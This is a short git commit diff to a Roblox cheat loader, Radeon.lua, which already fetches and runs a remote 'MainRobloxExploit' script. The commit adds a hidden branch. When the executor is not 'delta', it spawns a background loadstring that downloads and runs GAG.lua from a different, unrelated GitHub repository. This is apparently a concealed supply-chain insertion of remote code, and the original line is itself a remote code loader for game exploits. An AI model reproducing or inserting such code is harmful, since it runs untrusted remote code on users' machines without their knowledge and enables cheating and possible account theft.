f70f487746ae55987a586243d0abdad32fa9326d
wixboops <coke3@dr.com>
2025-06-18 01:14:01 -0500

    Update Radeon.lua

--- Radeon.lua
+++ Radeon.lua
@@ -1,1 +1,9 @@
+if identifyexecutor and identifyexecutor():lower():find("delta") then
+    print("delta")
+else
+    spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/GAG.lua"))();
+    end)
+end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RadeonScripts/RadeonHubMain/main/MainRobloxExploit"))()
